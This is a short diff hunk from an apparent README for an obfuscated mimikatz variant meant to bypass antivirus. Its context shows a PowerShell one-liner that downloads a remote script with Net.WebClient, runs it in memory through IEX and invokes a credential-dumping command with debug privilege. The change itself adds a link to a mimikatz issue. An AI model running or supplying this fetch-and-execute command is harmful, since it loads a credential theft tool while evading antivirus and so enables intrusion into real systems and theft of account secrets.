@@ -13,7 +13,7 @@ or via web:
 
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mttstt/mimi/master/Invoke-Mimidogz.ps1');Invoke-Mimidogz -Command "privilege::debug" 
 
-
+https://github.com/gentilkiwi/mimikatz/issues/83
 
 # Script to obfuscate mimikatz and bypass AV
     
